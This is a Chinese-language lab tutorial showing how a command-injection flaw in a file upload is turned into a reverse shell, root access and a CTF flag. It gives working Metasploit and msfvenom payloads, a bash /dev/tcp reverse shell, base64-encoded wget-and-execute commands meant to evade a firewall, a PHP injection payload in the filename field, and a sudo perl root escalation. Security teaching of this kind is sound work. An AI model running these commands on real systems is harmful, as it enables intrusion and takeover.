# 网络安全入门到精通：P43：18.20.命令注入2 🔧

在本节课中，我们将继续学习命令注入漏洞的实战利用。我们将利用上节课发现的漏洞，通过一系列步骤获取靶场机器的控制权，并最终取得目标Flag值。

## 回顾与准备

上一节我们介绍了如何利用`searchsploit`工具发现并验证了目标系统的命令注入漏洞。本节中，我们来看看如何利用这个漏洞进行完整的渗透测试。

除了`searchsploit`，我们还可以使用漏洞数据库网站进行搜索。以下是网站的链接。

网站中搜索到的内容与`searchsploit`工具的结果是一致的。希望大家以后能经常使用这个网站来搜索可利用的漏洞。

我们已经成功知道了如何利用漏洞。下面我们就利用这个漏洞来获取靶场机器的访问权限。

首先，由于实验环境原因，需要将靶场地址调整为`192.168.1.107`。攻击机地址保持不变。

在获取靶场权限时，我们将使用一种称为“反弹Shell”的方法。其核心思路是让靶场机器从我们的服务器下载一个Shell程序并执行，从而将控制权反弹回我们的攻击机，最后进行权限提升以获取Flag值。

在进行这个过程之前，我们需要进行准备工作。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_1.png)

## 第一步：配置攻击机监听

第一步是启动Metasploit框架，在某个固定端口监听反弹回来的Shell连接。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_3.png)

我们在攻击机中打开终端，执行以下操作。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_5.png)

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_7.png)

首先，使用`msfconsole`命令启动Metasploit。Metasploit是一个集成了渗透测试几乎所有工具的安全框架，可以系统性完成渗透测试任务，也是漏洞挖掘的利器。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_9.png)

```
msfconsole
```

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_11.png)

启动后，我们使用一个利用模块并设置载荷。

```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
```

接下来，我们需要查看并设置载荷所需的参数，主要是攻击机的IP地址和监听端口。

```
set LHOST 192.168.1.106
set LPORT 4444
```

设置完成后，可以检查参数是否正确，然后开始监听。

```
show options
exploit
```

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_13.png)

执行`exploit`后，Metasploit开始监听，但此时还没有Shell连接进来。我们需要生成一个能让靶机下载并执行的Shell程序。

## 第二步：生成Shell载荷

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_15.png)

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_17.png)

我们使用`msfvenom`工具来生成一个Linux下的反向TCP连接Shell程序。

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.106 LPORT=4444 -f elf > /var/www/html/shell.elf
```

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_19.png)

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_21.png)

这条命令的含义是：
*   `-p linux/x86/meterpreter/reverse_tcp`: 指定载荷类型为Linux x86架构的Meterpreter反向TCP连接。
*   `LHOST=192.168.1.106 LPORT=4444`: 指定反弹回连的IP和端口，需与上一步监听设置一致。
*   `-f elf`: 指定输出文件格式为ELF（Linux可执行文件）。
*   `> /var/www/html/shell.elf`: 将生成的文件重定向到Apache服务器的根目录下，命名为`shell.elf`。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_23.png)

执行后，会在`/var/www/html/`目录下生成`shell.elf`文件。为了方便，我们可以再生成一个简单的Shell脚本。

```
echo ‘/bin/bash -i >& /dev/tcp/192.168.1.106/4444 0>&1’ > /var/www/html/s
```

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_25.png)

接下来，需要启动Apache服务器，以便靶机能够通过HTTP下载我们生成的文件。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_27.png)

```
service apache2 start
```

## 第三步：构造并加密攻击命令

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_29.png)

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_30.png)

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_32.png)

现在，我们需要让靶场机器执行命令来下载并运行我们的Shell程序。由于靶机可能部署了防火墙，我们使用Base64编码来绕过检测。

以下是需要让靶机顺序执行的三条命令：

1.  **下载Shell文件**：使用`wget`命令从攻击机下载文件到靶机的临时目录。
2.  **赋予执行权限**：给下载的文件赋予可执行权限。
3.  **执行Shell文件**：运行该文件，建立反向连接。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_34.png)

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_36.png)

我们将每条命令分别进行Base64编码。

第一条命令（下载）：
```
echo ‘wget http://192.168.1.106/s -O /tmp/a’ | base64
```
第二条命令（赋权）：
```
echo ‘chmod 777 /tmp/a’ | base64
```
第三条命令（执行）：
```
echo ‘/tmp/a’ | base64
```

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_38.png)

## 第四步：利用漏洞执行命令

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_40.png)

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_42.png)

我们将利用之前发现的命令注入漏洞，通过修改HTTP请求中的`filename`参数，来依次执行上述三条Base64编码后的命令。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_44.png)

我们使用Burp Suite工具来拦截和修改HTTP请求。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_46.png)

首先，在Burp Suite中开启代理拦截，然后通过浏览器上传一个文件。Burp Suite会截获这个上传请求。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_48.png)

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_50.png)

我们将请求发送到Repeater模块进行修改。修改`filename`参数，利用PHP的`system`函数和`base64_decode`函数来执行我们编码后的命令。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_52.png)

例如，执行第一条下载命令的Payload格式为：
```
filename=“test.php; system(base64_decode(‘<Base64编码后的命令>’)); ?>.jpg”
```

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_54.png)

在Repeater中发送修改后的请求，就相当于在靶机上执行了下载命令。

重复这个过程，依次发送修改了第二条（赋权）和第三条（执行）命令的请求。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_56.png)

## 第五步：获取Shell与权限提升

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_58.png)

当第三条命令执行后，我们的Metasploit监听端应该会收到一个反弹回来的Shell连接。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_60.png)

在Metasploit终端中，输入`sessions -i 1`来与这个会话交互。我们可以执行`id`命令查看当前用户权限，通常不是root。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_62.png)

接下来进行权限提升。首先查看当前用户可以通过`sudo`执行哪些命令。
```
sudo -l
```
假设输出显示用户可以无密码以root权限运行`/usr/bin/perl`。我们可以利用这一点来提权。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_64.png)

执行以下命令获取一个root权限的Shell：
```
sudo perl -e ‘exec “/bin/bash”‘
bash -i
```
执行成功后，命令提示符会变成`#`，表示我们已经获得了root权限。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_66.png)

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_68.png)

## 第六步：寻找并获取Flag

最后一步是寻找Flag。Flag通常存放在根目录或特定用户目录下。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_70.png)

切换到根目录并列出文件：
```
cd /
ls
```
如果发现`flag.txt`或类似文件，使用`cat`命令查看其内容：
```
cat flag.txt
```
至此，我们就成功完成了对整个靶场的渗透，并获取了目标Flag值。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_72.png)

## 课程总结 🎯

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_74.png)

本节课我们一起学习了如何将一个命令注入漏洞转化为完整的系统控制权获取过程。关键步骤包括：配置监听、生成载荷、编码命令绕过防护、利用漏洞执行命令、建立反弹Shell、权限提升以及最终获取Flag。

在实战渗透测试中，信息收集至关重要。一定要根据收集到的信息（如服务版本、可利用的公开EXP等）有针对性地进行测试。对于Web系统，如果能直接利用现成的漏洞利用程序（EXP），就无需花费精力挖掘零日漏洞。掌握这些流程和思路，是成为一名合格安全研究员的基础。

![](img/4e5b7a78ec4ee95479fa9eb9e9dc3984_76.png)

---
**注意**：本教程所有内容仅用于合法授权的安全测试与学习。未经授权对任何系统进行渗透测试均属违法行为。